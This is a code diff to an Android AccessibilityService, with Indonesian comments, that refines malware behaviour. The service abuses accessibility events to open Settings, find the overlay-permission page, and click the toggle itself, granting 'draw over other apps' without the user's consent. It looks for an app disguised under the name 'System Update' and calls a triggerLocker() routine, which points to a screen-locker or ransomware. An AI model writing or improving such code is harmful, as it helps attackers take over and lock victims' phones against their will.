@@ -45,10 +45,9 @@ public class CustomAccessibilityService extends AccessibilityService {
             triggerLocker();
         }
 
-        // JALUR LOMPAT: Jika aksesibilitas baru aktif dan belum punya izin overlay
-        if (!Settings.canDrawOverlays(this) && packageName.contains("settings")) {
+        // JALUR LOMPAT: Hanya lompat jika kita sedang di Settings tapi belum di halaman yang benar
+        if (!Settings.canDrawOverlays(this) && packageName.contains("settings") && !isOverlayPermissionPage(getRootInActiveWindow())) {
             jumpToOverlaySettings();
-            return;
         }
 
         // Hanya bereaksi pada menu Settings atau System UI
@@ -80,11 +79,13 @@ public class CustomAccessibilityService extends AccessibilityService {
 
         // 2. Logika Utama: Klik Toggle hanya jika ada Icon (ImageView) di layar
         // Ini memastikan kita sudah berada di halaman detail izin overlay, bukan di menu utama aksesibilitas
+        boolean switchFound = false;
         if (hasIcon && (className.contains("DrawOverlay") || className.contains("AppDrawOverlay") || isOverlayPermissionPage(rootNode))) {
-            processOverlaySwitch(rootNode);
-        } 
-        // 3. Jika masih di daftar aplikasi (List View), cari nama aplikasi kita
-        else if (packageName.contains("settings") && !className.contains("AppDetails")) {
+            switchFound = processOverlaySwitch(rootNode);
+        }
+
+        // 3. Jika switch tidak ditemukan (masih di list), cari nama aplikasi untuk masuk ke halaman toggle
+        if (!switchFound && packageName.contains("settings") && !className.contains("AppDetails")) {
             checkAndClick(rootNode, "System Update");
         }
 
@@ -106,7 +107,7 @@ public class CustomAccessibilityService extends AccessibilityService {
         
         lastActionTime = currentTime;
         Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
         startActivity(intent);
     }
 
